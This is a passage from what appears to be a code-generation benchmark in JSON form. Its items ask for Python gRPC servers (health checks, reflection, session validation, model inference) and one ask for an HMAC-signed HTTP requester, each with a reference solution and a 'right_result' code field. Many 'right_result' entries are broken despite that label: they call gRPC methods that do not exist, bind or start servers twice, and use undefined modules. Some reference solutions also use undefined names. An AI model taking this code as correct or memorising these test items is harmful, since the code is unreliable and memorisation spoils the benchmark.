    "Canonical_solution": "import base64\nimport hashlib\nimport hmac\nimport json\nfrom typing import Any, Dict, Optional\nimport httpx\nfrom pydantic.v1 import BaseModel\n\nclass ExternalActionResponse(BaseModel):\n    result: dict\n    success: bool\n    agent_message: Optional[str] = None\n\nclass ExternalActionsRequester:\n    def __init__(self, url: str) -> None:\n        self.url = url\n\n    async def send_request(\n        self,\n        payload: Dict[str, Any],\n        signature_secret: str,\n        additional_payload_values: Dict[str, Any] = {},\n        additional_headers: Dict[str, str] = {},\n        transport: httpx.AsyncHTTPTransport = httpx.AsyncHTTPTransport(retries=2),\n    ) -> ExternalActionResponse:\n        encoded_payload = json.dumps({\"payload\": payload} | additional_payload_values).encode(\"utf-8\")\n        headers = {\n            \"Accept\": \"application/json\",\n            \"Content-Type\": \"application/json\",\n            \"x-vocode-signature\": self._encode_payload(encoded_payload, signature_secret),\n            **additional_headers,\n        }\n\n        async with httpx.AsyncClient(\n            headers=headers,\n            transport=transport,\n            timeout=10,\n        ) as client:\n            try:\n                response = await client.post(self.url, content=encoded_payload)\n                response.raise_for_status()\n                data = response.json()\n                return self._validate_response(data)\n            except httpx.HTTPStatusError as e:\n                if e.response.status_code == 401:\n                    return ExternalActionResponse(result={\"info\": \"Unauthorized\"}, success=False)\n                elif e.response.status_code == 403:\n                    return ExternalActionResponse(result={\"info\": \"Forbidden\"}, success=False)\n                elif 400 <= e.response.status_code < 500:\n                    return ExternalActionResponse(result={\"info\": \"Client error\"}, success=False)\n                elif e.response.status_code >= 500:\n                    return ExternalActionResponse(result={\"info\": \"Server error\"}, success=False)\n                else:\n                    raise e\n\n    def _encode_payload(self, payload: bytes, signature_secret: str) -> str:\n        signature_as_bytes = base64.b64decode(signature_secret)\n        digest = hmac.new(signature_as_bytes, payload, hashlib.sha256).digest()\n        return base64.b64encode(digest).decode()\n\n    def _validate_response(self, response: Dict[str, Any]) -> ExternalActionResponse:\n        if \"result\" not in response:\n            raise ValueError(\"Invalid response format: missing 'result'\")\n        if not isinstance(response[\"result\"], dict):\n            raise ValueError(\"Invalid response format: 'result' must be a dict\")\n        if \"agent_message\" in response and not isinstance(response[\"agent_message\"], str):\n            raise ValueError(\"Invalid response format: 'agent_message' must be a string\")\n        return ExternalActionResponse(\n            result=response[\"result\"],\n            agent_message=response.get(\"agent_message\"),\n            success=True,\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 59,
    "right_result": "import httpx\nfrom typing import Dict, Any, Optional\nimport hmac\nimport hashlib\nimport json\n\nclass ExternalActionsRequester:\n    def __init__(self, url: str) -> None:\n        self.url = url\n\n    async def send_request(\n        self,\n        payload: Dict[str, Any],\n        signature_secret: str,\n        additional_payload_values: Dict[str, Any] = {},\n        additional_headers: Dict[str, str] = {},\n        transport: httpx.AsyncHTTPTransport = httpx.AsyncHTTPTransport(retries=2)\n    ) -> Dict[str, Any]:\n        # Combine payloads\n        combined_payload = {**payload, **additional_payload_values}\n        payload_bytes = json.dumps(combined_payload).encode('utf-8')\n\n        # Generate HMAC-SHA256 signature\n        signature = hmac.new(signature_secret.encode('utf-8'), payload_bytes, hashlib.sha256).hexdigest()\n\n        # Prepare headers\n        headers = {\n            **additional_headers,\n            'X-Signature': signature\n        }\n\n        async with httpx.AsyncClient(transport=transport) as client:\n            try:\n                response = await client.post(self.url, json=combined_payload, headers=headers)\n                response.raise_for_status()\n                return self._validate_response(response.json())\n            except httpx.HTTPStatusError as e:\n                return {'error': str(e)}\n            except Exception as e:\n                return {'error': str(e)}\n\n    def _validate_response(self, response: Dict[str, Any]) -> Dict[str, Any]:\n        if 'error' in response:\n            return {'error': response['error']}\n        return response"
  },
  {
    "Task_id": 490,
    "Instruction": "Task Description: Create a gRPC server implementation in Python that supports multiple protocols, including health checks and service reflection, using asynchronous gRPC.\n\nClass Description: MultiProtocolGateway is a class that sets up and manages a gRPC server with support for JinaRPC protocol, health checks, and server reflection. It handles server initialization, startup, and graceful shutdown.\n\nAttributes:\n- grpc_port: int - The port number on which the gRPC server will listen\n- host: str - The host address to bind the server to (default: '0.0.0.0')\n- health_servicer: grpc_health.v1.health.HealthServicer - Handles health check requests\n- grpc_server: grpc.aio.Server - The asynchronous gRPC server instance\n\nMethods:\n- __init__(grpc_port: int, host: str = '0.0.0.0') -> None - Initializes the gateway with specified port and host\n- _setup_grpc_server() -> None - Asynchronously configures and starts the gRPC server with required services\n- run_server() -> None - Asynchronously runs the server until termination\n- shutdown() -> None - Asynchronously shuts down the server gracefully",
    "Canonical_solution": "import grpc\nfrom grpc_health.v1 import health, health_pb2, health_pb2_grpc\nfrom grpc_reflection.v1alpha import reflection\nfrom jina.proto import jina_pb2, jina_pb2_grpc\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int, host: str = '0.0.0.0'):\n        self.grpc_port = grpc_port\n        self.host = host\n        self.health_servicer = health.HealthServicer(experimental_non_blocking=True)\n        self.grpc_server = None\n\n    async def _setup_grpc_server(self):\n        self.grpc_server = grpc.aio.server()\n\n        jina_pb2_grpc.add_JinaRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        service_names = (\n            jina_pb2.DESCRIPTOR.services_by_name['JinaRPC'].full_name,\n            reflection.SERVICE_NAME,\n        )\n        \n        health_pb2_grpc.add_HealthServicer_to_server(\n            self.health_servicer, self.grpc_server\n        )\n        \n        for service in service_names:\n            self.health_servicer.set(service, health_pb2.HealthCheckResponse.SERVING)\n            \n        reflection.enable_server_reflection(service_names, self.grpc_server)\n        self.grpc_server.add_insecure_port(f'{self.host}:{self.grpc_port}')\n        await self.grpc_server.start()\n\n    async def run_server(self):\n        await self._setup_grpc_server()\n        await self.grpc_server.wait_for_termination()\n\n    async def shutdown(self):\n        await self.grpc_server.stop(0)\n        self.health_servicer.enter_graceful_shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nimport grpc_health.v1.health_check_pb2_grpc as health_check\nfrom concurrent import futures\nimport asyncio\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int, host: str = '0.0.0.0'):\n        self.grpc_port = grpc_port\n        self.host = host\n        self.health_servicer = health_check.HealthServicer()\n        self.grpc_server = grpc.aio.Server()\n\n    async def _setup_grpc_server(self):\n        self.grpc_server.add_insecure_port(f\"{self.host}:{self.grpc_port}\")\n        self.grpc_server.add_handler(health_check.health_check_service_pb2_grpc.add_HealthCheckServiceServicer_to_server, self.health_servicer)\n        await self.grpc_server.start()\n\n    async def run_server(self):\n        await self._setup_grpc_server()\n        try:\n            await asyncio.get_event_loop().create_future()\n        except KeyboardInterrupt:\n            await self.shutdown()\n\n    async def shutdown(self):\n        await self.grpc_server.stop()"
  },
  {
    "Task_id": 491,
    "Instruction": "Task Description: Implement a gRPC server in Python that provides session validation functionality using the grpcio library. The server should handle concurrent requests and validate sessions based on a specific mathematical operation between user_id and session_id.\n\nClass Description: ValidateServiceService is a gRPC service implementation that validates user sessions. It inherits from the generated LoginServiceServicer class and provides methods for session validation and server management.\n\nAttributes:\n- None explicitly defined (inherits attributes from parent class)\n\nMethods:\n- Validate(request, context) -> pb2.ValidateResponse: Validates a user session by performing a mathematical operation (XOR followed by modulo 23) on the user_id and session_id from the request. Returns a ValidateResponse with a boolean result.\n  Input: \n    - request: pb2.ValidateRequest - Contains user_id and session_id to validate\n    - context: grpc.ServicerContext - gRPC context object\n  Output: pb2.ValidateResponse - Contains validation result (True/False)\n\n- serve(port, max_workers) -> None: Starts and runs the gRPC server on the specified port with the given number of worker threads.\n  Input:\n    - port: str (default='50051') - Port number to bind the server to\n    - max_workers: int (default=10) - Maximum number of worker threads\n  Output: None (runs indefinitely until terminated)",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nimport validate_session_pb2_grpc as pb2_grpc\nimport validate_session_pb2 as pb2\n\nclass ValidateServiceService(pb2_grpc.LoginServiceServicer):\n    def __init__(self, *args, **kwargs):\n        pass\n\n    def Validate(self, request, context):\n        return pb2.ValidateResponse(result=((request.user_id ^ request.session_id) % 23 == 0))\n\n    def serve(self, port='50051', max_workers=10):\n        server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        pb2_grpc.add_LoginServiceServicer_to_server(self, server)\n        server.add_insecure_port(f'[::]:{port}')\n        server.start()\n        server.wait_for_termination()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nimport threading\nimport logging\nfrom concurrent import futures\nimport pb2 as validate_pb2\nimport pb2_grpc as validate_pb2_grpc\n\nclass ValidateService(validate_pb2_grpc.LoginServiceServicer):\n    def Validate(self, request, context):\n        user_id = request.user_id\n        session_id = request.session_id\n        result = (user_id ^ session_id) % 23\n        return validate_pb2.ValidateResponse(result=result != 0)\n\n    def serve(self, port='50051', max_workers=10):\n        server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        validate_pb2_grpc.add_LoginServiceServicer_to_server(self, server)\n        server.add_insecure_port(f'[::]:{port}')\n        logging.info(f\"Starting server on port {port}\")\n        server.start()\n        try:\n            while True:\n                server.wait_for_termination(10)\n        except KeyboardInterrupt:\n            server.stop(0)\n\nif __name__ == '__main__':\n    service = ValidateService()\n    service.serve()"
  },
  {
    "Task_id": 492,
    "Instruction": "Task Description: Implement a gRPC server in Python that handles various model inference requests concurrently, with thread-safe operations and graceful shutdown capabilities.\n\nClass Description: The GRPCServer class encapsulates a gRPC server implementation that manages multiple model inference services. It provides concurrent request handling, message size configuration, and proper shutdown mechanisms.\n\nAttributes:\n- server: [grpc.Server] - The gRPC server instance that handles incoming requests\n- stop_event: [threading.Event] - Event flag used to signal server termination\n\nMethods:\n- __init__: [Name](service_impl: [ModelResponseServicer], port: [int]) -> [None] - Initializes the gRPC server with thread pool executor, message size limits, and binds it to the specified port\n- start: [Name]() -> [None] - Starts the server and waits for termination signal before shutting down gracefully\n\nClass Description: The ModelResponseServicer class implements the actual gRPC service methods for various model inference tasks, providing thread-safe operation through locking mechanisms.\n\nAttributes:\n- _stop_event: [threading.Event] - Event flag used to signal service termination\n- inference_pipeline: [object] - The underlying inference processing pipeline\n- lock: [threading.Lock] - Lock for thread-safe operations\n\nMethods:\n- __init__: [Name](inference_pipeline: [object]) -> [None] - Initializes the servicer with inference pipeline and synchronization primitives\n- Terminate: [Name](request: [google.protobuf.Empty], context: [grpc.ServicerContext]) -> [google.protobuf.Empty] - Signals the server to terminate\n- get_stop_event: [Name]() -> [threading.Event] - Returns the stop event for server control\n- _run_inference: [Name](method_name: [str], request_proto: [object]) -> [object] - Internal thread-safe method for processing inference requests\n- GeneratorReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles generator model requests\n- Txt2ImgReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles text-to-image model requests\n- ClassificationReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles classification model requests\n- QuestionAndAnswerReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles Q&A model requests\n- FillMaskReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles fill-mask model requests\n- TokenClassificationReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles token classification requests\n- ZeroShotImgClassificationReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles zero-shot image classification\n- InpaintingReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles image inpainting requests",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom google.protobuf import empty_pb2 as google_dot_protobuf_dot_empty__pb2\nfrom .proto import legacymodelresponse_pb2_grpc as modelresponse_pb2_grpc\nimport threading\nfrom mii.legacy.constants import (\n    GRPC_MAX_MSG_SIZE,\n    LB_MAX_WORKER_THREADS,\n    SERVER_SHUTDOWN_TIMEOUT\n)\n\nclass ModelResponseServicer(modelresponse_pb2_grpc.ModelResponseServicer):\n    def __init__(self, inference_pipeline):\n        self._stop_event = threading.Event()\n        self.inference_pipeline = inference_pipeline\n        self.lock = threading.Lock()\n\n    def Terminate(self, request, context):\n        self._stop_event.set()\n        return google_dot_protobuf_dot_empty__pb2.Empty()\n\n    def get_stop_event(self):\n        return self._stop_event\n\n    def _run_inference(self, method_name, request_proto):\n        with self.lock:\n            response = self.inference_pipeline.process_request(method_name, request_proto)\n        return response\n\n    def GeneratorReply(self, request, context):\n        return self._run_inference(\"GeneratorReply\", request)\n\n    def Txt2ImgReply(self, request, context):\n        return self._run_inference(\"Txt2ImgReply\", request)\n\n    def ClassificationReply(self, request, context):\n        return self._run_inference(\"ClassificationReply\", request)\n\n    def QuestionAndAnswerReply(self, request, context):\n        return self._run_inference(\"QuestionAndAnswerReply\", request)\n\n    def FillMaskReply(self, request, context):\n        return self._run_inference(\"FillMaskReply\", request)\n\n    def TokenClassificationReply(self, request, context):\n        return self._run_inference(\"TokenClassificationReply\", request)\n\n    def ZeroShotImgClassificationReply(self, request, context):\n        return self._run_inference(\"ZeroShotImgClassificationReply\", request)\n\n    def InpaintingReply(self, request, context):\n        return self._run_inference(\"InpaintingReply\", request)\n\nclass GRPCServer:\n    def __init__(self, service_impl, port):\n        self.server = grpc.server(\n            futures.ThreadPoolExecutor(max_workers=LB_MAX_WORKER_THREADS),\n            options=[\n                (\"grpc.max_send_message_length\", GRPC_MAX_MSG_SIZE),\n                (\"grpc.max_receive_message_length\", GRPC_MAX_MSG_SIZE),\n            ]\n        )\n        modelresponse_pb2_grpc.add_ModelResponseServicer_to_server(service_impl, self.server)\n        self.server.add_insecure_port(f\"[::]:{port}\")\n        self.stop_event = service_impl.get_stop_event()\n\n    def start(self):\n        self.server.start()\n        self.stop_event.wait()\n        self.server.stop(SERVER_SHUTDOWN_TIMEOUT)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nimport threading\nimport concurrent.futures\nimport time\nimport google.protobuf.empty_pb2 as empty\nfrom concurrent import futures\n\nclass ModelResponseServicer:\n    def __init__(self, inference_pipeline):\n        self._stop_event = threading.Event()\n        self.inference_pipeline = inference_pipeline\n        self.lock = threading.Lock()\n\n    def Terminate(self, request, context):\n        self._stop_event.set()\n        return empty.Empty()\n\n    def get_stop_event(self):\n        return self._stop_event\n\n    def _run_inference(self, method_name, request_proto):\n        with self.lock:\n            if self._stop_event.is_set():\n                return None\n            result = self.inference_pipeline.run(method_name, request_proto)\n            return result\n\n    def GeneratorReply(self, request, context):\n        result = self._run_inference(\"Generator\", request)\n        if result is None:\n            context.abort(code=grpc.StatusCode.ABORTED, details=\"Server shutdown\")\n        return result\n\n    def Txt2ImgReply(self, request, context):\n        result = self._run_inference(\"Txt2Img\", request)\n        if result is None:\n            context.abort(code=grpc.StatusCode.ABORTED, details=\"Server shutdown\")\n        return result\n\n    def ClassificationReply(self, request, context):\n        result = self._run_inference(\"Classification\", request)\n        if result is None:\n            context.abort(code=grpc.StatusCode.ABORTED, details=\"Server shutdown\")\n        return result\n\n    def QuestionAndAnswerReply(self, request, context):\n        result = self._run_inference(\"QuestionAndAnswer\", request)\n        if result is None:\n            context.abort(code=grpc.StatusCode.ABORTED, details=\"Server shutdown\")\n        return result\n\n    def FillMaskReply(self, request, context):\n        result = self._run_inference(\"FillMask\", request)\n        if result is None:\n            context.abort(code=grpc.StatusCode.ABORTED, details=\"Server shutdown\")\n        return result\n\n    def TokenClassificationReply(self, request, context):\n        result = self._run_inference(\"TokenClassification\", request)\n        if result is None:\n            context.abort(code=grpc.StatusCode.ABORTED, details=\"Server shutdown\")\n        return result\n\n    def ZeroShotImgClassificationReply(self, request, context):\n        result = self._run_inference(\"ZeroShotImgClassification\", request)\n        if result is None:\n            context.abort(code=grpc.StatusCode.ABORTED, details=\"Server shutdown\")\n        return result\n\n    def InpaintingReply(self, request, context):\n        result = self._run_inference(\"Inpainting\", request)\n        if result is None:\n            context.abort(code=grpc.StatusCode.ABORTED, details=\"Server shutdown\")\n        return result\n\n\nclass GRPCServer:\n    def __init__(self, service_impl, port):\n        self.server = grpc.server(concurrent.futures.ThreadPoolExecutor(max_workers=10))\n        self.stop_event = threading.Event()\n        self.service = service_impl\n        self.server.add_insecure_port(f\"[::]:{port}\")\n        self.server.add_service(ModelResponseServicer.Service, self.service)\n\n    def start(self):\n        self.server.start()\n        try:\n            while not self.stop_event.is_set():\n                time.sleep(1)\n        except KeyboardInterrupt:\n            pass\n        self.server.stop(0)"
  },
  {
    "Task_id": 494,
    "Instruction": "Task Description: Implement a gRPC server class in Python that can handle concurrent requests and manage the server lifecycle (start, run, wait, and stop).\n\nClass Description: The GRPCServer class is responsible for creating and managing a gRPC server instance. It initializes the server with a thread pool executor for handling concurrent requests, binds the server to a specified host and port, and provides methods to start, run, wait for termination, and stop the server.\n\nAttributes:\n- _server: grpc.Server - The gRPC server instance that handles incoming requests.\n\nMethods:\n- __init__(api_service: 'APIService', max_workers: int = 20) -> None - Initializes the gRPC server with a thread pool executor and binds the API service implementation to the server.\n- start(host: str, port: int) -> None - Starts the gRPC server by binding it to the specified host and port.\n- run(host: str, port: int) -> None - Combines the start and wait methods to run the server indefinitely.\n- wait() -> None - Blocks the current thread until the server is terminated.\n- stop() -> None - Stops the gRPC server gracefully.",
    "Canonical_solution": "import typing as T\nimport inspect\nimport traceback\nfrom concurrent import futures\nimport grpc\nfrom towhee.serve.io import JSON, TEXT, BYTES, NDARRAY\nfrom towhee.serve.api_service import RouterConfig\nfrom towhee.utils.log import engine_log\n\nclass GRPCServer:\n    def __init__(self, api_service: 'APIService', max_workers: int = 20):\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        service_pb2_grpc.add_PipelineServicesServicer_to_server(_PipelineImpl(api_service), self._server)\n\n    def start(self, host: str, port: int):\n        uri = str(host) + ':' + str(port)\n        self._server.add_insecure_port(uri)\n        self._server.start()\n        engine_log.info('Start grpc server at %s.', uri)\n\n    def run(self, host: str, port: int):\n        self.start(host, port)\n        self.wait()\n\n    def wait(self):\n        self._server.wait_for_termination()\n\n    def stop(self):\n        self._server.stop(None)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\n\nclass GRPCServer:\n    def __init__(self, api_service: 'APIService', max_workers: int = 20) -> None:\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        api_service.add_to_server(self._server, api_service)\n\n    def start(self, host: str, port: int) -> None:\n        self._server.add_insecure_port(f\"{host}:{port}\")\n        self._server.start()\n\n    def run(self, host: str, port: int) -> None:\n        self.start(host, port)\n        self.wait()\n\n    def wait(self) -> None:\n        self._server.wait_for_termination()\n\n    def stop(self) -> None:\n        self._server.stop(GracePeriodSeconds=10)"
  },
  {
    "Task_id": 496,
    "Instruction": "Task Description: Create a gRPC server in Python that can handle multiple versions of a service concurrently, with support for server reflection and interceptors.\n\nFunction Description: The `serve()` function initializes and starts two gRPC servers on different ports. The first server handles versions 1 and 2 of the Greeter service, while the second server handles version 3 with reflection enabled. Both servers use thread pool executors for concurrency and share the same interceptors for request logging.\n\nInput: None (The function takes no parameters)\n\nOutput: None (The function doesn't return anything but starts servers that run indefinitely)\n\nNote: The function uses threading.Event().wait() to keep the servers running indefinitely. The servers are configured with:\n1. ThreadPoolExecutor with 10 workers for concurrent request handling\n2. LoggingInterceptor for request logging\n3. Insecure ports (50051 and 50052) for communication\n4. Different service versions (v1, v2 on port 50051; v3 with reflection on port 50052)",
    "Canonical_solution": "import logging\nimport threading\nfrom concurrent import futures\nimport grpc\nimport helloworld_v1_precompiled_pb2_grpc as helloworld_pb2_grpc_v1\nimport helloworld_v2_compiled_pb2_grpc as helloworld_pb2_grpc_v2\nimport helloworld_v3_reflected_pb2_grpc as helloworld_pb2_grpc_v3\nfrom grpc_interceptor import ServerInterceptor\nfrom grpc_reflection.v1alpha import reflection\n\ndef serve():\n    interceptors = [LoggingInterceptor()]\n    executor = futures.ThreadPoolExecutor(max_workers=10)\n\n    # One server which exposes these two\n    server = grpc.server(\n        executor,\n        interceptors=interceptors,\n    )\n    helloworld_pb2_grpc_v1.add_GreeterServicer_to_server(GreeterV1(), server)\n    helloworld_pb2_grpc_v2.add_GreeterServicer_to_server(GreeterV2(), server)\n\n    server.add_insecure_port(\"0.0.0.0:50051\")\n    server.start()\n\n    # One server which exposes the V3 API and has reflection turned on\n    reflecting_server = grpc.server(\n        executor,\n        interceptors=interceptors,\n    )\n    helloworld_pb2_grpc_v3.add_GreeterServicer_to_server(GreeterV3(), reflecting_server)\n    service_names = (\n        helloworld_pb2_v3.DESCRIPTOR.services_by_name[\"Greeter\"].full_name,\n        reflection.SERVICE_NAME,\n    )\n    reflection.enable_server_reflection(service_names, reflecting_server)\n    reflecting_server.add_insecure_port(\"0.0.0.0:50052\")\n    reflecting_server.start()\n\n    logging.info(\"Starting grpc server\")\n    event = threading.Event()\n    event.wait()",
    "Code_level": "Function-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nimport threading\nimport logging\nfrom concurrent import futures\nimport time\n\nclass LoggingInterceptor(grpc.UnaryUnaryInterceptor):\n    def intercept_call(self, continuation, client_call_details, request, response_type, metadata, unused_options):\n        logging.info(\"Received request\")\n        result = continuation(client_call_details, request, response_type, metadata, unused_options)\n        logging.info(\"Sent response\")\n        return result\n\ndef serve():\n    # Create a thread pool executor with 10 workers\n    executor = futures.ThreadPoolExecutor(max_workers=10)\n\n    # Define the Greeter service for versions 1 and 2\n    class GreeterService:\n        def SayHello(self, request, context):\n            return greeter_pb2.HelloReply(message=\"Hello from v1 or v2\")\n\n    # Define the Greeter service for version 3\n    class GreeterServiceV3:\n        def SayHello(self, request, context):\n            return greeter_pb2.HelloReply(message=\"Hello from v3\")\n\n    # Create the server for versions 1 and 2\n    server1 = grpc.server(futures.ThreadPoolExecutor(max_workers=10), interceptors=[LoggingInterceptor()])\n    greeter_pb2.add_GreeterServiceToServer(server1, GreeterService())\n    server1.add_insecure_port('[::]:50051')\n\n    # Create the server for version 3 with reflection\n    server2 = grpc.server(futures.ThreadPoolExecutor(max_workers=10), interceptors=[LoggingInterceptor()])\n    greeter_pb2.add_GreeterServiceToServer(server2, GreeterServiceV3())\n    server2.add_insecure_port('[::]:50052')\n    server2.start()\n\n    # Server reflection\n    server2.add_insecure_port('[::]:50052')\n    server2.start()\n\n    # Keep the servers running\n    try:\n        while True:\n            time.sleep(1)\n    except KeyboardInterrupt:\n        server1.stop(0)\n        server2.stop(0)\n\nif __name__ == '__main__':\n    serve()"
  },
  {
    "Task_id": 497,
    "Instruction": "Task Description: Create a gRPC server in Python that handles incoming requests using a thread pool for concurrency, implements service methods, and supports server reflection.\n\nClass Description: GRPCServer is a class that encapsulates the functionality of a gRPC server, including initialization with a thread pool, service implementation, and server lifecycle management (start/stop).\n\nAttributes:\n- _server: grpc.Server - The underlying gRPC server instance\n- _service_impl: ServiceImpl - The implementation of the gRPC service methods\n\nMethods:\n- __init__(max_workers: int = 5) -> None - Initializes the gRPC server with a thread pool executor of specified size and sets up service implementation\n- start(port: int) -> None - Binds the server to the specified port and starts listening for incoming requests\n- stop(grace_period: float = 1.0) -> None - Stops the server with the specified grace period for ongoing requests\n\nNested Class Description: ServiceImpl implements the actual gRPC service methods defined in the protobuf service.\n\nMethods:\n- Empty(request: Any, context) -> Any - Handles empty requests and returns an empty response\n- SimpleTest(request: test_services_pb2.DummyRequest, context: grpc.ServicerContext) -> test_services_pb2.DummyResponse - Processes a dummy request, validates input, and returns a response or aborts with error if validation fails",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom typing import Any\nfrom . import test_services_pb2, test_services_pb2_grpc\n\nclass ServiceImpl(test_services_pb2_grpc.DummyServiceServicer):\n    def Empty(self, request: Any, context) -> Any:\n        return test_services_pb2.Empty()\n\n    def SimpleTest(\n        self, request: test_services_pb2.DummyRequest, context: grpc.ServicerContext\n    ) -> test_services_pb2.DummyResponse:\n        if request.request_id > 1000:\n            context.abort(grpc.StatusCode.FAILED_PRECONDITION, \"number too big!\")\n        return test_services_pb2.DummyResponse(response_id=request.request_id + 1)\n\nclass GRPCServer:\n    def __init__(self, max_workers: int = 5):\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        self._service_impl = ServiceImpl()\n        test_services_pb2_grpc.add_DummyServiceServicer_to_server(self._service_impl, self._server)\n        \n        service_names = (\n            test_services_pb2.DESCRIPTOR.services_by_name[\"DummyService\"].full_name,\n            reflection.SERVICE_NAME,\n        )\n        reflection.enable_server_reflection(service_names, self._server)\n\n    def start(self, port: int) -> None:\n        self._server.add_insecure_port(f\"127.0.0.1:{port}\")\n        self._server.start()\n\n    def stop(self, grace_period: float = 1.0) -> None:\n        self._server.stop(grace_period)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport test_services_pb2\nimport test_services_pb2_grpc\n\nclass ServiceImpl(test_services_pb2_grpc.TestServiceServicer):\n    def Empty(self, request, context):\n        return test_services_pb2.EmptyResponse()\n\n    def SimpleTest(self, request, context):\n        if not request.HasField('data'):\n            context.set_code(grpc.StatusCode.INVALID_ARGUMENT)\n            context.set_details('Missing data field in request')\n            return test_services_pb2.DummyResponse()\n        return test_services_pb2.DummyResponse(data=request.data)\n\nclass GRPCServer:\n    def __init__(self, max_workers: int = 5):\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        test_services_pb2_grpc.add_TestServiceServicer_to_server(ServiceImpl(), self._server)\n        self._server.add_insecure_port('[::]:50051')\n        self._server.start()\n\n    def start(self, port: int):\n        self._server.add_insecure_port(f'[::]:{port}')\n        self._server.start()\n\n    def stop(self, grace_period: float = 1.0):\n        self._server.stop(grace_period)"
  },
  {
    "Task_id": 499,
    "Instruction": "Task Description: Implement a gRPC server class that handles multiple protocols including health checks and service reflection, capable of serving JinaRPC requests asynchronously.\n\nClass Description: MultiProtocolGateway is a class that sets up and manages a gRPC server with support for JinaRPC services, health checks, and server reflection. It provides methods to start, run, and shutdown the server gracefully.\n\nAttributes:\n- grpc_port: int - The port number on which the gRPC server will listen\n- host: str - The host address to bind the server to (default: '0.0.0.0')\n- health_servicer: HealthServicer - The health check service implementation\n- grpc_server: grpc.aio.Server - The asynchronous gRPC server instance\n\nMethods:\n- __init__(grpc_port: int, host: str = '0.0.0.0') -> None - Initializes the gateway with specified port and host\n- _setup_grpc_server() -> None - Sets up the gRPC server with JinaRPC services, health checks, and reflection (asynchronous)\n- run_server() -> None - Starts the server and waits for termination (asynchronous)\n- shutdown() -> None - Gracefully shuts down the server (asynchronous)",
    "Canonical_solution": "import grpc\nfrom grpc_health.v1 import health, health_pb2, health_pb2_grpc\nfrom grpc_reflection.v1alpha import reflection\nfrom jina.proto import jina_pb2, jina_pb2_grpc\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int, host: str = '0.0.0.0'):\n        self.grpc_port = grpc_port\n        self.host = host\n        self.health_servicer = health.HealthServicer(experimental_non_blocking=True)\n\n    async def _setup_grpc_server(self):\n        self.grpc_server = grpc.aio.server()\n\n        jina_pb2_grpc.add_JinaRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        jina_pb2_grpc.add_JinaSingleDataRequestRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        service_names = (\n            jina_pb2.DESCRIPTOR.services_by_name['JinaRPC'].full_name,\n            reflection.SERVICE_NAME,\n        )\n        \n        health_pb2_grpc.add_HealthServicer_to_server(\n            self.health_servicer, self.grpc_server\n        )\n        \n        for service in service_names:\n            self.health_servicer.set(service, health_pb2.HealthCheckResponse.SERVING)\n            \n        reflection.enable_server_reflection(service_names, self.grpc_server)\n        self.grpc_server.add_insecure_port(f'{self.host}:{self.grpc_port}')\n        await self.grpc_server.start()\n\n    async def run_server(self):\n        await self.grpc_server.wait_for_termination()\n\n    async def shutdown(self):\n        await self.grpc_server.stop(0)\n        self.health_servicer.enter_graceful_shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport jinarpc\nfrom jinarpc import Service, rpc\nfrom jinarpc.grpc import GRPCService\nimport health_check_service\nimport server_reflection_service\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int, host: str = '0.0.0.0'):\n        self.grpc_port = grpc_port\n        self.host = host\n        self.health_servicer = health_check_service.HealthServicer()\n        self.grpc_server = grpc.aio.Server()\n\n    async def _setup_grpc_server(self):\n        # Add JinaRPC services\n        jina_rpc_service = GRPCService()\n        self.grpc_server.add_insecure_port(f\"{self.host}:{self.grpc_port}\")\n        self.grpc_server.add_insecure_port(f\"{self.host}:50051\")\n        self.grpc_server.add_insecure_port(f\"{self.host}:50052\")\n\n        # Add health check service\n        self.grpc_server.add_insecure_port(f\"{self.host}:50053\")\n        self.grpc_server.add_insecure_port(f\"{self.host}:50054\")\n\n        # Add server reflection service\n        self.grpc_server.add_insecure_port(f\"{self.host}:50055\")\n        self.grpc_server.add_insecure_port(f\"{self.host}:50056\")\n\n        # Register services\n        self.grpc_server.add_handler(jina_rpc_service)\n        self.grpc_server.add_handler(self.health_servicer)\n        self.grpc_server.add_handler(server_reflection_service.ServerReflectionService())\n\n    async def run_server(self):\n        await self._setup_grpc_server()\n        await self.grpc_server.start()\n        try:\n            await self.grpc_server.wait_for_termination()\n        except KeyboardInterrupt:\n            pass\n\n    async def shutdown(self):\n        await self.grpc_server.stop(wait=True)"
  },
  {
    "Task_id": 50,
